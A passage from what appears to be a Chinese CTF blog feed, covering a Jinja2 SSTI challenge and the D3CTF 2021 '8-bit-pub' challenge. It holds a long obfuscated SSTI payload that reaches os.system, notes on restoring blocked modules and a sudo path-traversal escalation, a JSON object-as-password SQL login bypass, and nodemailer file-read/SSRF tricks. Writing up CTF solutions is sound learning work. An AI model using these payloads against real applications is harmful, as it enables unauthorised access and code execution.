punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span><span class="token number">20a</span><span class="token operator">=</span>udl<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>nine<span class="token operator">|</span>string<span class="token punctuation">,</span>seven<span class="token operator">|</span>string<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">|</span>int<span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span><span class="token number">20b</span><span class="token operator">=</span>udl<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>nine<span class="token operator">|</span>string<span class="token punctuation">,</span>eight<span class="token operator">|</span>string<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">|</span>int<span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span><span class="token number">20d</span><span class="token operator">=</span>udl<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>one<span class="token operator">|</span>string<span class="token punctuation">,</span>zero<span class="token operator">|</span>string<span class="token punctuation">,</span>zero<span class="token operator">|</span>string<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">|</span>int<span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span><span class="token number">20e</span><span class="token operator">=</span>udl<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>one<span class="token operator">|</span>string<span class="token punctuation">,</span>zero<span class="token operator">|</span>string<span class="token punctuation">,</span>one<span class="token operator">|</span>string<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">|</span>int<span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20g<span class="token operator">=</span>udl<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>one<span class="token operator">|</span>string<span class="token punctuation">,</span>zero<span class="token operator">|</span>string<span class="token punctuation">,</span>three<span class="token operator">|</span>string<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">|</span>int<span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20i<span class="token operator">=</span>udl<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>one<span class="token operator">|</span>string<span class="token punctuation">,</span>zero<span class="token operator">|</span>string<span class="token punctuation">,</span>five<span class="token operator">|</span>string<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">|</span>int<span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20l<span class="token operator">=</span>udl<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>one<span class="token operator">|</span>string<span class="token punctuation">,</span>zero<span class="token operator">|</span>string<span class="token punctuation">,</span>eight<span class="token operator">|</span>string<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">|</span>int<span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20m<span class="token operator">=</span>udl<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>one<span class="token operator">|</span>string<span class="token punctuation">,</span>zero<span class="token operator">|</span>string<span class="token punctuation">,</span>nine<span class="token operator">|</span>string<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">|</span>int<span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20n<span class="token operator">=</span>udl<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>one<span class="token operator">|</span>string<span class="token punctuation">,</span>one<span class="token operator">|</span>string<span class="token punctuation">,</span>zero<span class="token operator">|</span>string<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">|</span>int<span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20o<span class="token operator">=</span>udl<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>one<span class="token operator">|</span>string<span class="token punctuation">,</span>one<span class="token operator">|</span>string<span class="token punctuation">,</span>one<span class="token operator">|</span>string<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">|</span>int<span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20p<span class="token operator">=</span>udl<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>one<span class="token operator">|</span>string<span class="token punctuation">,</span>one<span class="token operator">|</span>string<span class="token punctuation">,</span>two<span class="token operator">|</span>string<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">|</span>int<span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20r<span class="token operator">=</span>udl<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>one<span class="token operator">|</span>string<span class="token punctuation">,</span>one<span class="token operator">|</span>string<span class="token punctuation">,</span>four<span class="token operator">|</span>string<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">|</span>int<span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20s<span class="token operator">=</span>udl<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>one<span class="token operator">|</span>string<span class="token punctuation">,</span>one<span class="token operator">|</span>string<span class="token punctuation">,</span>five<span class="token operator">|</span>string<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">|</span>int<span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20t<span class="token operator">=</span>udl<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>one<span class="token operator">|</span>string<span class="token punctuation">,</span>one<span class="token operator">|</span>string<span class="token punctuation">,</span>six<span class="token operator">|</span>string<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">|</span>int<span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20u<span class="token operator">=</span>udl<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>one<span class="token operator">|</span>string<span class="token punctuation">,</span>one<span class="token operator">|</span>string<span class="token punctuation">,</span>seven<span class="token operator">|</span>string<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">|</span>int<span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20v<span class="token operator">=</span>udl<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>one<span class="token operator">|</span>string<span class="token punctuation">,</span>one<span class="token operator">|</span>string<span class="token punctuation">,</span>eight<span class="token operator">|</span>string<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">|</span>int<span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20w<span class="token operator">=</span>udl<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>one<span class="token operator">|</span>string<span class="token punctuation">,</span>one<span class="token operator">|</span>string<span class="token punctuation">,</span>nine<span class="token operator">|</span>string<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">|</span>int<span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20y<span class="token operator">=</span>udl<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>one<span class="token operator">|</span>string<span class="token punctuation">,</span>two<span class="token operator">|</span>string<span class="token punctuation">,</span>one<span class="token operator">|</span>string<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">|</span>int<span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20class<span class="token operator">=</span><span class="token punctuation">(</span>xhx<span class="token punctuation">,</span>xhx<span class="token punctuation">,</span>c<span class="token punctuation">,</span>l<span class="token punctuation">,</span>a<span class="token punctuation">,</span>s<span class="token punctuation">,</span>s<span class="token punctuation">,</span>xhx<span class="token punctuation">,</span>xhx<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20init<span class="token operator">=</span><span class="token punctuation">(</span>xhx<span class="token punctuation">,</span>xhx<span class="token punctuation">,</span>i<span class="token punctuation">,</span>n<span class="token punctuation">,</span>i<span class="token punctuation">,</span>t<span class="token punctuation">,</span>xhx<span class="token punctuation">,</span>xhx<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20global<span class="token operator">=</span><span class="token punctuation">(</span>xhx<span class="token punctuation">,</span>xhx<span class="token punctuation">,</span>g<span class="token punctuation">,</span>l<span class="token punctuation">,</span>o<span class="token punctuation">,</span>b<span class="token punctuation">,</span>a<span class="token punctuation">,</span>l<span class="token punctuation">,</span>s<span class="token punctuation">,</span>xhx<span class="token punctuation">,</span>xhx<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20builtins<span class="token operator">=</span><span class="token punctuation">(</span>xhx<span class="token punctuation">,</span>xhx<span class="token punctuation">,</span>b<span class="token punctuation">,</span>u<span class="token punctuation">,</span>i<span class="token punctuation">,</span>l<span class="token punctuation">,</span>t<span class="token punctuation">,</span>i<span class="token punctuation">,</span>n<span class="token punctuation">,</span>s<span class="token punctuation">,</span>xhx<span class="token punctuation">,</span>xhx<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20getitem<span class="token operator">=</span><span class="token punctuation">(</span>xhx<span class="token punctuation">,</span>xhx<span class="token punctuation">,</span>g<span class="token punctuation">,</span>e<span class="token punctuation">,</span>t<span class="token punctuation">,</span>i<span class="token punctuation">,</span>t<span class="token punctuation">,</span>e<span class="token punctuation">,</span>m<span class="token punctuation">,</span>xhx<span class="token punctuation">,</span>xhx<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20eval<span class="token operator">=</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>v<span class="token punctuation">,</span>a<span class="token punctuation">,</span>l<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20timeit<span class="token operator">=</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span>i<span class="token punctuation">,</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>i<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20import<span class="token operator">=</span><span class="token punctuation">(</span>xhx<span class="token punctuation">,</span>xhx<span class="token punctuation">,</span>i<span class="token punctuation">,</span>m<span class="token punctuation">,</span>p<span class="token punctuation">,</span>o<span class="token punctuation">,</span>r<span class="token punctuation">,</span>t<span class="token punctuation">,</span>xhx<span class="token punctuation">,</span>xhx<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20os<span class="token operator">=</span><span class="token punctuation">(</span>o<span class="token punctuation">,</span>s<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20system<span class="token operator">=</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span>y<span class="token punctuation">,</span>s<span class="token punctuation">,</span>t<span class="token punctuation">,</span>e<span class="token punctuation">,</span>m<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20subprocess<span class="token operator">=</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span>u<span class="token punctuation">,</span>b<span class="token punctuation">,</span>p<span class="token punctuation">,</span>r<span class="token punctuation">,</span>o<span class="token punctuation">,</span>c<span class="token punctuation">,</span>e<span class="token punctuation">,</span>s<span class="token punctuation">,</span>s<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20pty<span class="token operator">=</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span>t<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20imp<span class="token operator">=</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>m<span class="token punctuation">,</span>p<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20reload<span class="token operator">=</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span>e<span class="token punctuation">,</span>l<span class="token punctuation">,</span>o<span class="token punctuation">,</span>a<span class="token punctuation">,</span>d<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20spawn<span class="token operator">=</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span>p<span class="token punctuation">,</span>a<span class="token punctuation">,</span>w<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20ls<span class="token operator">=</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span>s<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20osm<span class="token operator">=</span>config<span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>init<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token keyword">global</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>getitem<span class="token punctuation">)</span><span class="token punctuation">(</span>builtins<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>getitem<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">import</span><span class="token punctuation">)</span><span class="token punctuation">(</span>os<span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token punctuation">{</span>config<span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>init<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token keyword">global</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>getitem<span class="token punctuation">)</span><span class="token punctuation">(</span>builtins<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>getitem<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">import</span><span class="token punctuation">)</span><span class="token punctuation">(</span>imp<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>reload<span class="token punctuation">)</span><span class="token punctuation">(</span>osm<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
</code></pre>
<p>龟龟好长，当初为了写这么大一段这个可能就花了快一个小时，其实双大括号内过滤数字，大括号百分号里面能用数字，能省不少事。。。</p>
<p>然后打到命令执行，我还以为快出了，结果反手一个<code>system gone</code>，试了下subprocess gone，popen gone，spawn gone。提示给了一个subprocess命令执行，可是subprocess明明已经没有了，看懵了GG</p>
<p>fix环节登上去看到看一眼，过滤就之前看到的数字，join和request，然后一句<code>sys.modules[&quot;subprocess&quot;] = &quot;subprocess gone&quot;</code>把subprocess模块给禁了，不知道为什么剩下的模块都用不了，如上面的payload所示，我还比赛时还尝试着用reload函数重新加载模块，但没有用</p>
<p>赛后交流环节有提到可以<code>del</code>或者调用<code>delattr</code>把这个模块先删掉，再重新import一下就可以了。也有人说虽然把subprocess什么的删了，但是有一个叫subprocess.Popen的类还活着，能直接拿来用？？？不是很懂。还有什么posix.popen，multiprocess.popen。比赛时做到这就结束了，命令执行都没打下来，据说命令执行之后还有一个提权，有一个提权程序要求等待三年之后才能提权，通过修改时间服务把时间调到三年后打通（这就是我不清楚的后话了）</p>
<p>修复方法，ssti在模板不可控的时候基本上都是因为render_template_string这个函数出问题的，这里为了触发漏洞专门在render_template外面套了一层render_template_string，删去即可</p>
<h4 id="update"><a href="#update" class="headerlink" title="update"></a>update</h4><p>后来看了一些wp，解决方案挺多的，用subprocess.Popen可以执行命令，也可以把模块先删除再引入，覆盖掉被污染的模块，也可以用imp库的load_source方法直接猜测os之类库的.py文件的位置，重新加载一个自己的os模块</p>
<p>命令执行之后<code>sudo -l</code>看有什么命令可以sudo，然后找到一个shell脚本，脚本写的有一点点bug，大体意思是可以去执行一个可执行文件，本身目录是限制在了service下的，但是能目录穿越，解决方案就是写一个sh脚本直接执行</p>
<h3 id="web2web3"><a href="#web2web3" class="headerlink" title="web2web3"></a>web2web3</h3><p>因为web4花了几乎所有时间，这两个题看都没看，所以也完全不会修，乱改了一下理所当然的没修好</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>SSTI</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>[D3CTF2021]记录</title>
    <url>/%5BD3CTF%5D%E8%AE%B0%E5%BD%95.html</url>
    <content><![CDATA[<h1 id="D3CTF2021-记录"><a href="#D3CTF2021-记录" class="headerlink" title="[D3CTF2021]记录"></a>[D3CTF2021]记录</h1><p>难到自闭，所以就只能叫做记录了。。。最简单的8-bit-pub看了两天头都给打蒙了，剩下的题基本上就不想看了<br>开始对着wp复现</p>
<h2 id="8-bit-pub"><a href="#8-bit-pub" class="headerlink" title="8-bit-pub"></a>8-bit-pub</h2><p>前端好看，反手进行一个下载<br>给了源码，主要看一下就三点，以admin身份登录，admin拥有发邮件功能，shvl很可疑的原型链污染库</p>
<h3 id="Admin登录"><a href="#Admin登录" class="headerlink" title="Admin登录"></a>Admin登录</h3><p>先看登录部分，使用了session-file-store和mysql两个库</p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> sql <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"../utils/db.js"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>
  signup<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">,</span> done<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    sql<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span>
      <span class="token string">"SELECT * FROM test WHERE username = ?"</span><span class="token punctuation">,</span>
      <span class="token punctuation">[</span>username<span class="token punctuation">]</span><span class="token punctuation">,</span>
      <span class="token keyword">function</span> <span class="token punctuation">(</span>err<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>
          console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"error: "</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> <span class="token function">done</span><span class="token punctuation">(</span>err<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">{</span>
          sql<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span>
            <span class="token string">"INSERT INTO test VALUES (?, ?)"</span><span class="token punctuation">,</span>
            <span class="token punctuation">[</span>username<span class="token punctuation">,</span> password<span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token keyword">function</span> <span class="token punctuation">(</span>err<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>
              <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"error: "</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> <span class="token function">done</span><span class="token punctuation">(</span>err<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
              <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> <span class="token function">done</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> res<span class="token punctuation">.</span>insertId<span class="token punctuation">)</span><span class="token punctuation">;</span>
              <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
          <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
          <span class="token keyword">return</span> <span class="token function">done</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
            message<span class="token punctuation">:</span> <span class="token string">"Username already taken."</span>
          <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>

  signin<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">,</span> done<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    sql<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span>
      <span class="token string">"SELECT * FROM test WHERE username = ? AND password = ?"</span><span class="token punctuation">,</span>
      <span class="token punctuation">[</span>username<span class="token punctuation">,</span> password<span class="token punctuation">]</span><span class="token punctuation">,</span>
      <span class="token keyword">function</span> <span class="token punctuation">(</span>err<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>
          console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">.</span>pollute<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>
          console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"error: "</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> <span class="token function">done</span><span class="token punctuation">(</span>err<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
          <span class="token keyword">return</span> <span class="token function">done</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> res<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre>
<p>session-file-store在能控制文件并掌握密钥后能进行身份伪造，登录用户名会写入session文件中，但尝试了一下并不能通过截断之类的方法构造出一个合法session文件，特殊字符均被转义。（并且真实源码中密钥位数很大，无法爆破，虽然给的源码里就六个星号。。。所以一直想着怎么整一个session文件之后再爆破密钥）</p>
<p>看SQL部分，注册时会先查询用户名是否存在，所以不能注册admin账户了，考虑过用admin+超长空格+1使得查询时查不到而插入时被截断去除空格来注册一个额外的admin账户，但数据库设置了不允许重复键，失败</p>
<p>一开始我以为这个是用了预处理的，毕竟那个?怎么看都像是预处理占位符，但是在把数据格式换成json并瞎几把按的时候，出现了报错，我们就意识到了这个预处理存在问题</p>
<p>查看mysql库文档，得到如下解释</p>
<blockquote>
<p>This looks similar to prepared statements in MySQL, however it really just uses the same connection.escape() method internally.<br>Strings are safely escaped<br>Nested arrays are turned into grouped lists (for bulk inserts), e.g. [[‘a’, ‘b’], [‘c’, ‘d’]] turns into (‘a’, ‘b’), (‘c’, ‘d’)<br>Objects are turned into key &#x3D; ‘val’ pairs for each enumerable property on the object. If the property’s value is a function, it is skipped; if the property’s value is an object, toString() is called on it and the returned value is used.</p>
</blockquote>
<p>真有你的，我一直以为是预处理在看file-session-store怎么打<br>简单来说就根本不是预处理，遇到String类型的还能好好转义一下，剩下类型的就改成诡异的形式给你拼进去<br>既然如此就直接登录admin账号吧，提交<code>&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;: &#123;&quot;username&quot;: &quot;1&quot;&#125;&#125;</code><br>这样子之前的语句就变成了<code>SELECT * FROM test WHERE username = &quot;admin&quot; AND password = username = &quot;aaa&quot;</code></p>
<h4 id="MySQL列比较"><a href="#MySQL列比较" class="headerlink" title="MySQL列比较"></a>MySQL列比较</h4><p>这里还有一个很有意思的东西，就是这里的password&#x3D;username这么个比较，得到的结果居然是password列和username列每一行比较的结果，相同为1不同为0，而WHERE子句后面的部分是顺序执行的，所以AND后面列比较的结果就会取username所在行的结果<br>这里先取到username为admin的那一行，再比较这行的<code>password=username=&quot;aaa&quot;</code>，因为username和password不同得到0，字符串”aaa”与0比较得到1，成功以admin身份登录</p>
<h3 id="sendmail"><a href="#sendmail" class="headerlink" title="sendmail"></a>sendmail</h3><p>这个是一个超级无敌安全库，专门去查了历史CVE和issue，但是连官方文档都说自己非常安全</p>
<blockquote>
<p>Heavy focus on <strong>security</strong>, no-one likes RCE vulnerabilities</p>
</blockquote>
<h4 id="任意文件读取-amp-SSRF"><a href="#任意文件读取-amp-SSRF" class="headerlink" title="任意文件读取&amp;SSRF"></a>任意文件读取&amp;SSRF</h4><p>但是翻到有一个参数path，可以选择本地文件作为邮件内容，能够做到任意文件读取了，还有一个href可以简单地ssrf<br><code>href – an URL to the file (data uris are allowed as well)</code><br>当然超级安全的这个库有两个选项<code>disableFileAccess,disableUrlAccess</code>能阻止文件读取和ssrf，不过这里没配置<br>所以做到任意文件读取，把源码翻了出来，没变化，也就是把原来打星号的密钥变成了明文<del>长的一逼，亏给的源码就六个星号</del></p>
<h4 id="RCE探索"><a href="#RCE探索" class="headerlink" title="RCE探索"></a>RCE探索</h4><p>这里写了一个shvl库的深度赋值和然后就是一个sendmail函数调用了，想打只能打sendmail，只能硬看这个库了，发邮件那里有可能是通过执行命令完成的<br>看源码</p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">send</span><span class="token punctuation">(</span>contents<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">let</span> transporter <span class="token operator">=</span> nodemailer<span class="token punctuation">.</span><span class="token function">createTransport</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  host<span class="token punctuation">:</span> <span class="token string">"******"</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// Plz use your own smtp server for testing.</span>
  port<span class="token punctuation">:</span> <span class="token number">25</span><span class="token punctuation">,</span>
  tls<span class="token punctuation">:</span> <span class="token punctuation">{</span> rejectUnauthorized<span class="token punctuation">:</span> <span class="token boolean">false</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>
  auth<span class="token punctuation">:</span> <span class="token punctuation">{</span>
    user<span class="token punctuation">:</span> <span class="token string">"******"</span><span class="token punctuation">,</span>
    pass<span class="token punctuation">:</span> <span class="token string">"******"</span><span class="token punctuation">,</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
